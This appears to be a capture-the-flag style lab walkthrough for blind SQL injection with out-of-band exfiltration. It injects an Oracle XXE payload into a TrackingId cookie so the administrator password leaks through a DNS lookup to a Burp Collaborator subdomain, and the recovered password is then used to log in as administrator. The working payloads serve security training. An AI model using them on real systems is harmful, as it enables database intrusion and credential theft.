Step 1 : Intercept the request using BurpSuite Pro.

Step 2 : Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
  ```
  ' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual-- 
  ```
  
Step 3: Go to Burp Collaborator Client and copy the subdomain and paste it in payload. For eg:
   ```
   ' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.r3vye0nv6el7u6if1jv68khh78dz1o.burpcollaborator.net"> %remote;]>'),'/l') FROM dual-- 
   ```
   
Step 4: Copy and paste it after TrakingId Cookie, then URL encode it then send.

Step 5: Now go to Burp Collaborator, and press 'Poll now'  to confirm that a DNS lookup occurred.

Step 6: You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.

Step 7: Click "My account" to open the login page. Use the password to log in as the administrator user.
